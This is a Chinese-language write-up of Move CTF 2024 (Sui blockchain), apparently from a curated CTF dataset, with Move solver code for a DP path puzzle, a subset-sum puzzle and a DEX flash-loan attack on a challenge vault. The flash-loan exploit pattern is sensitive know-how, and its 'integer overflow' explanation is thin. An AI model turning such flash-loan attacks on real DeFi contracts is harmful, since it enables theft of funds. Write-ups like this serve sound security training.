---
title: Move CTF 2024 Writeup (ZAN + 蚂蚁天穹实验室 联合战队 第 8 名)
contest: Move CTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [Sui 链, Move 语言, DEX 攻击, flash loan, 整数溢出, subset sum, ZK]
attack_chain: |
  1. 比赛: Move CTF 2024 由 MoveBit + ChainFlag + MoveFuns + OpenBuild 主办, Sui 基金会赞助
  2. ZAN + 蚂蚁天穹 联合战队 排名第 8 / 119 参赛队, 解决 7/8 题目
  3. dynamic_matrix_traversal: dynamic_programming 矩阵路径 (类似 LeetCode unique paths)
     - up(m, n): 二维 DP, 边界 1, 内部 f[i][j] = f[i-1][j] + row[j-1]
     - execute(record, m, n) 两次, 满足 count_1 < count_3 + count_2 > count_4 → get_flag
  4. swap: DEX flash loan 攻击
     - swap_a_to_b: amount_out_B = coin.value * vault.coin_b / vault.coin_a
     - attack: flash 99 + swap + flash 101 + get_flag + repay
     - 整数溢出: flash 99 vs 101 → 利用计算公式差异
  5. Subset: subset_sum 求解 (3 个子集，每个元素 0/1)
     - ans1 = [1, 0, 0, 1, 1] (5 个 0/1)
     - ans2 = [0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, ...] (40 个 0/1)
     - ans3 = [0, 0, 0, 0, 0, 1, 0, 0, ...] (80 个 0/1)
     - solve_subset1/2/3 三个子集都满足 → get_flag
  6. 其他题: easygame / kitchen / zk1 / zk2 (ZK + DEX)
key_payload: |
  # dynamic_matrix_traversal 求解:
  def up(m, n):
      f = []
      for i in range(m):
          row = []
          for j in range(n):
              if j == 0 or i == 0:
                  row.append(1)
              else:
                  f1 = f[i-1]
                  j1 = row[j-1]
                  val = f1[j] + j1
                  row.append(val)
          f.append(row)
      return f[m-1][n-1]
  
  # 满足: count_1 < count_3 AND count_2 > count_4
  
  # swap flash loan attack:
  public entry fun attack(vault, coin_a, ctx) {
      let (loan_a, loan_b, res) = swap::vault::flash(vault, 99, false, ctx);
      let swap_coin = coin::split(coin_a, 1, ctx);
      let swap_b = swap::vault::swap_a_to_b(vault, swap_coin, ctx);
      transfer::public_transfer(swap_b, sender);
      swap::vault::repay_flash(vault, loan_a, loan_b, res);
      (loan_a, loan_b, res) = swap::vault::flash(vault, 101, false, ctx);
      swap::vault::get_flag(vault, ctx);
      swap::vault::repay_flash(vault, loan_a, loan_b, res);
  }
  
  # Subset ans:
  let ans1 = vector [1, 0, 0, 1, 1];
  let ans2 = vector [0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0];
  let ans3 = vector [0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0];
  subset_sum::solve_subset1(ans1, &mut status);
  subset_sum::solve_subset2(ans2, &mut status);
  subset_sum::solve_subset3(ans3, &mut status);
  subset_sum::get_flag(& status, ctx);
one_liner: Move CTF 2024 (Sui/Move 生态) ZAN + 蚂蚁天穹 联合战队第 8 名: DP 矩阵 + DEX flash loan + Subset sum 求解。
lesson: |
  - Move CTF 是 Sui/Aptos 生态的专属 CTF, Move 语言 + Sui 链交互
  - dynamic_matrix_traversal 是 LeetCode unique paths 模板: f[i][j] = f[i-1][j] + row[j-1]
  - DEX flash loan 整数溢出: flash 99/101 的差异利用 vault 公式
  - Subset sum: 三个独立 0/1 子集都满足约束 → get_flag
  - ZK 题目 (zk1/zk2): circuit 满足性证明
  - Move 智能合约: module + public entry fun + transfer::public_transfer
quality: high
---

# Move CTF 2024 Writeup

> 来源: ctfiot.com 157167

## 比赛背景

- **主办**: MoveBit + ChainFlag + MoveFuns + OpenBuild
- **赞助**: Sui 基金会
- **参赛**: 119 队，ZAN + 蚂蚁天穹 联合战队第 8 名，解决 7/8 题目

## dynamic_matrix_traversal (DP 矩阵路径)

```move
fun up(m: u64, n: u64): u64 {
    let f: vector<vector> = vector::empty();
    let i = 0;
    while (i < m) {
        let row = vector::empty();
        let j = 0;
        while (j < n) {
            if (j == 0 || i == 0) {
                vector::push_back(&mut row, 1);
            } else {
                let f1 = *vector::borrow(&f, i - 1);
                let j1 = *vector::borrow(&row, j - 1);
                let val = *vector::borrow(&f1, j) + j1;
                vector::push_back(&mut row, val);
            };
            j = j + 1;
        };
        vector::push_back(&mut f, row);
        i = i + 1;
    };
    *vector::borrow(vector::borrow(&f, m - 1), n - 1)
}

public entry fun execute(record: &mut Record, m: u64, n: u64) {
    if (record.count_1 == 0) {
        let result = up(m, n);
        assert!(result == TARGET_VALUE_1, ERROR_RESULT_1);
        record.count_1 = m;
        record.count_2 = n;
    } else if (record.count_3 == 0) {
        let result = up(m, n);
        assert!(result == TARGET_VALUE_2, ERROR_RESULT_2);
        record.count_3 = m;
        record.count_4 = n;
    }
}

public entry fun get_flag(record: &Record, ctx: &mut TxContext) {
    assert!(record.count_1 < record.count_3, ERROR_PARAM_1);
    assert!(record.count_2 > record.count_4, ERROR_PARAM_2);
    event::emit(Flag { user: tx_context::sender(ctx), flag: true });
}
```

**约束**: `count_1 < count_3 AND count_2 > count_4` + 两次 up(m, n) 等于 TARGET_VALUE

## swap (DEX Flash Loan)

```move
public fun swap_a_to_b<A, B>(vault: &mut Vault<A, B>, coina: Coin<A>, ctx: &mut TxContext): Coin<B> {
    let amount_out_B = coin::value(&coina) * balance::value(&vault.coin_b) / balance::value(&vault.coin_a);
    coin::put<A>(&mut vault.coin_a, coina);
    coin::take(&mut vault.coin_b, amount_out_B, ctx)
}

public entry fun attack(vault, coin_a, ctx) {
    let (loan_a, loan_b, res) = swap::vault::flash(vault, 99, false, ctx);
    let swap_coin = coin::split(coin_a, 1, ctx);
    let swap_b = swap::vault::swap_a_to_b(vault, swap_coin, ctx);
    transfer::public_transfer(swap_b, sender);
    swap::vault::repay_flash(vault, loan_a, loan_b, res);
    (loan_a, loan_b, res) = swap::vault::flash(vault, 101, false, ctx);
    swap::vault::get_flag(vault, ctx);
    swap::vault::repay_flash(vault, loan_a, loan_b, res);
}
```

**整数溢出 trick**: flash 99 vs 101 → vault 计算公式差异利用

## Subset (subset sum 求解)

```move
module solve_subset::ans {
    public entry fun solveIt(ctx) {
        let status = subset_sum::get_status(ctx);
        let ans1 = vector [1, 0, 0, 1, 1];
        let ans2 = vector [0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, ...];
        let ans3 = vector [0, 0, 0, 0, 0, 1, 0, 0, ...];
        subset_sum::solve_subset1(ans1, &mut status);
        subset_sum::solve_subset2(ans2, &mut status);
        subset_sum::solve_subset3(ans3, &mut status);
        subset_sum::get_flag(&status, ctx);
    }
}
```

三个独立 0/1 子集都满足约束 → get_flag

## 评价

Move CTF 2024 (Sui/Move 生态) 高质量 writeup：
- **DP 矩阵路径** (LeetCode unique paths 模板)
- **DEX flash loan 整数溢出** (经典 DeFi 攻击)
- **Subset sum 求解** (3 个 0/1 子集)
- **ZK 题目** (circuit 满足性证明)

ZAN + 蚂蚁天穹 联合战队第 8 名，国内区块链安全研究团队的成绩。

适用读者：区块链安全 / Sui/Move 合约开发 / DEX 攻击研究
